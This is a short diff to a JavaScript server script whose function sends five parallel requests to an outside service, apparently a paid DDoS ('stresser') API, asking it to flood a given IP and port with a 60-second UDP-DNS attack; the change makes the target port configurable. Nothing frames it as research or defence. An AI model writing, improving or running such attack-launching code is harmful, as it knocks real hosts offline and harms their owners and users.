@@ -54,7 +54,7 @@ async function clear() {
 }
 
 async function sendApiRequest(ip) {
-    const url = `https://darlingapi.com?token=${token}&host=${ip}&port=0&time=60&method=UDP-DNS`;
+    const url = `https://darlingapi.com?token=${token}&host=${ip}&port=${port}&time=60&method=UDP-DNS`;
     const requests = Array(5).fill(url).map(u => axios.get(u));
     
     try {
@@ -152,6 +152,3 @@ app.listen(port, () => {
 });
 
 setInterval(clear, 1000 * 60 * 60);
-
-
-
